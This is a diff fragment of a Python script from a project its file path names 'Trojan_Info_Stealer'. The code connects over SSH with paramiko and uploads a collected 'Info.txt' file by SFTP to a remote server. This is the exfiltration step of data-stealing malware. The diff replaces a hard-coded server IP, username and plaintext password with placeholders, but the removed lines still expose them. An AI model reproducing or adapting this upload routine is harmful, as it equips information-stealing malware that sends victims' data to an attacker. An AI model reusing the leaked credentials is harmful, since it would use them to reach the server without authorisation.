@@ -10,12 +10,12 @@ time.sleep(15)
 
 ssh = paramiko.SSHClient()
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-ssh.connect('52.140.63.55', username='hassan', password='Qwertyfox@01')
+ssh.connect('Server IP', username='', password='')
 
 # print ("connected successfully!")
 
 sftp = ssh.open_sftp()
-sftp.put("E:/Github_Projects/Trojan_Info_Stealer/Info.txt", "/home/hassan/info/info.txt")
+sftp.put("Local_Path", "Remote_Path")
 sftp.close()
 ssh.close()
 
